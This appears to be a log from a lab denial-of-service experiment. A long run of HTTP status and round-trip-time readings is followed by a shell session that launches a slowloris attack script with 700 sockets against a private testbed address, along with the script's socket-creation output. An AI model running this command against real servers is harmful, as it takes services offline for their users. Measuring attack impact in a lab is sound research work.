[✓] 27-06-2025 16:03:09 | HTTP Status: 200	RTT: 274.29 ms
[✓] 27-06-2025 16:03:10 | HTTP Status: 200	RTT: 264.49 ms
[✓] 27-06-2025 16:03:11 | HTTP Status: 200	RTT: 275.81 ms
[✓] 27-06-2025 16:03:12 | HTTP Status: 200	RTT: 299.55 ms
[✓] 27-06-2025 16:03:12 | HTTP Status: 200	RTT: 271.78 ms
[✓] 27-06-2025 16:03:13 | HTTP Status: 200	RTT: 276.66 ms
[✓] 27-06-2025 16:03:14 | HTTP Status: 200	RTT: 52.50 ms
[✓] 27-06-2025 16:03:15 | HTTP Status: 200	RTT: 250.65 ms
[✓] 27-06-2025 16:03:15 | HTTP Status: 200	RTT: 235.99 ms
[✓] 27-06-2025 16:03:16 | HTTP Status: 200	RTT: 296.90 ms
[✓] 27-06-2025 16:03:17 | HTTP Status: 200	RTT: 252.84 ms
[✓] 27-06-2025 16:03:18 | HTTP Status: 200	RTT: 242.16 ms
[✓] 27-06-2025 16:03:18 | HTTP Status: 200	RTT: 52.99 ms
[✓] 27-06-2025 16:03:19 | HTTP Status: 200	RTT: 286.17 ms
[✓] 27-06-2025 16:03:20 | HTTP Status: 200	RTT: 290.59 ms
[✓] 27-06-2025 16:03:20 | HTTP Status: 200	RTT: 236.60 ms
[✓] 27-06-2025 16:03:21 | HTTP Status: 200	RTT: 247.46 ms
[✓] 27-06-2025 16:03:22 | HTTP Status: 200	RTT: 253.17 ms
[✓] 27-06-2025 16:03:23 | HTTP Status: 200	RTT: 230.62 ms
[✓] 27-06-2025 16:03:23 | HTTP Status: 200	RTT: 282.70 ms
[✓] 27-06-2025 16:03:24 | HTTP Status: 200	RTT: 274.64 ms
[✓] 27-06-2025 16:03:25 | HTTP Status: 200	RTT: 269.81 ms
[✓] 27-06-2025 16:03:26 | HTTP Status: 200	RTT: 240.70 ms
[✓] 27-06-2025 16:03:26 | HTTP Status: 200	RTT: 238.62 ms
[✓] 27-06-2025 16:03:27 | HTTP Status: 200	RTT: 266.63 ms
[✓] 27-06-2025 16:03:28 | HTTP Status: 200	RTT: 308.49 ms
[✓] 27-06-2025 16:03:29 | HTTP Status: 200	RTT: 66.18 ms
[✓] 27-06-2025 16:03:29 | HTTP Status: 200	RTT: 261.90 ms
[✓] 27-06-2025 16:03:30 | HTTP Status: 200	RTT: 281.20 ms
[✓] 27-06-2025 16:03:31 | HTTP Status: 200	RTT: 285.81 ms
[✓] 27-06-2025 16:03:32 | HTTP Status: 200	RTT: 219.30 ms
[✓] 27-06-2025 16:03:32 | HTTP Status: 200	RTT: 250.35 ms
[✓] 27-06-2025 16:03:33 | HTTP Status: 200	RTT: 278.21 ms
[✓] 27-06-2025 16:03:34 | HTTP Status: 200	RTT: 275.07 ms
[✓] 27-06-2025 16:03:35 | HTTP Status: 200	RTT: 282.05 ms
[✓] 27-06-2025 16:03:36 | HTTP Status: 200	RTT: 246.93 ms
[✓] 27-06-2025 16:03:36 | HTTP Status: 200	RTT: 281.95 ms
[✓] 27-06-2025 16:03:37 | HTTP Status: 200	RTT: 330.80 ms
[✓] 27-06-2025 16:03:38 | HTTP Status: 200	RTT: 281.00 ms
[✓] 27-06-2025 16:03:39 | HTTP Status: 200	RTT: 293.45 ms
[✓] 27-06-2025 16:03:39 | HTTP Status: 200	RTT: 70.32 ms
[✓] 27-06-2025 16:03:40 | HTTP Status: 200	RTT: 374.36 ms
[✓] 27-06-2025 16:03:41 | HTTP Status: 200	RTT: 272.23 ms
[✓] 27-06-2025 16:03:42 | HTTP Status: 200	RTT: 275.40 ms
[✓] 27-06-2025 16:03:42 | HTTP Status: 200	RTT: 59.96 ms
[✓] 27-06-2025 16:03:43 | HTTP Status: 200	RTT: 299.13 ms
[✓] 27-06-2025 16:03:44 | HTTP Status: 200	RTT: 334.27 ms
[✓] 27-06-2025 16:03:45 | HTTP Status: 200	RTT: 62.67 ms
[✓] 27-06-2025 16:03:45 | HTTP Status: 200	RTT: 63.72 ms
[✓] 27-06-2025 16:03:46 | HTTP Status: 200	RTT: 283.02 ms
[✓] 27-06-2025 16:03:47 | HTTP Status: 200	RTT: 58.29 ms
[✓] 27-06-2025 16:03:47 | HTTP Status: 200	RTT: 263.46 ms
[✓] 27-06-2025 16:03:48 | HTTP Status: 200	RTT: 220.80 ms
[✓] 27-06-2025 16:03:49 | HTTP Status: 200	RTT: 253.46 ms
[✓] 27-06-2025 16:03:49 | HTTP Status: 200	RTT: 435.31 ms
[✓] 27-06-2025 16:03:50 | HTTP Status: 200	RTT: 355.97 ms
[✓] 27-06-2025 16:03:51 | HTTP Status: 200	RTT: 52.15 ms
[✓] 27-06-2025 16:03:52 | HTTP Status: 200	RTT: 227.45 ms
[✓] 27-06-2025 16:03:52 | HTTP Status: 200	RTT: 255.17 ms
[✓] 27-06-2025 16:03:53 | HTTP Status: 200	RTT: 315.20 ms
[✓] 27-06-2025 16:03:54 | HTTP Status: 200	RTT: 319.37 ms
[✓] 27-06-2025 16:03:55 | HTTP Status: 200	RTT: 297.47 ms
[✓] 27-06-2025 16:03:56 | HTTP Status: 200	RTT: 245.66 ms
[✓] 27-06-2025 16:03:56 | HTTP Status: 200	RTT: 308.82 ms
[✓] 27-06-2025 16:03:57 | HTTP Status: 200	RTT: 255.62 ms
[✓] 27-06-2025 16:03:58 | HTTP Status: 200	RTT: 255.80 ms
[✓] 27-06-2025 16:03:59 | HTTP Status: 200	RTT: 271.18 ms
[✓] 27-06-2025 16:03:59 | HTTP Status: 200	RTT: 270.11 ms
[✓] 27-06-2025 16:04:00 | HTTP Status: 200	RTT: 205.82 ms
[✓] 27-06-2025 16:04:01 | HTTP Status: 200	RTT: 61.05 ms
[✓] 27-06-2025 16:04:01 | HTTP Status: 200	RTT: 217.11 ms
[✓] 27-06-2025 16:04:02 | HTTP Status: 200	RTT: 233.87 ms
[✓] 27-06-2025 16:04:03 | HTTP Status: 200	RTT: 245.30 ms
[✓] 27-06-2025 16:04:04 | HTTP Status: 200	RTT: 266.23 ms
[✓] 27-06-2025 16:04:04 | HTTP Status: 200	RTT: 282.28 ms
[✓] 27-06-2025 16:04:05 | HTTP Status: 200	RTT: 341.66 ms
[✓] 27-06-2025 16:04:06 | HTTP Status: 200	RTT: 262.39 ms
[✓] 27-06-2025 16:04:07 | HTTP Status: 200	RTT: 253.96 ms
[✓] 27-06-2025 16:04:08 | HTTP Status: 200	RTT: 245.86 ms
[✓] 27-06-2025 16:04:08 | HTTP Status: 200	RTT: 255.42 ms
[✓] 27-06-2025 16:04:09 | HTTP Status: 200	RTT: 290.11 ms
[✓] 27-06-2025 16:04:10 | HTTP Status: 200	RTT: 272.10 ms


===============================================
python3 slowloris.py 192.168.71.135 -S 10.0.0.2 -s 300root@abea599e2e23:/opt/oai-nr-ue/etc/lowRateDoS# python3 slowloris.py 192.168.71.135 -S 10.0.0.2 -s 700
[27-06-2025 16:03:34] Attacking 192.168.71.135 with 700 sockets.
[27-06-2025 16:03:34] Creating sockets...
[27-06-2025 16:03:50] Sending keep-alive headers...
[27-06-2025 16:03:50] Socket count: 418
[27-06-2025 16:03:50] Creating 282 new sockets...
[27-06-2025 16:04:05] Sending keep-alive headers...
[27-06-2025 16:04:05] Socket count: 418
[27-06-2025 16:04:05] Creating 282 new sockets...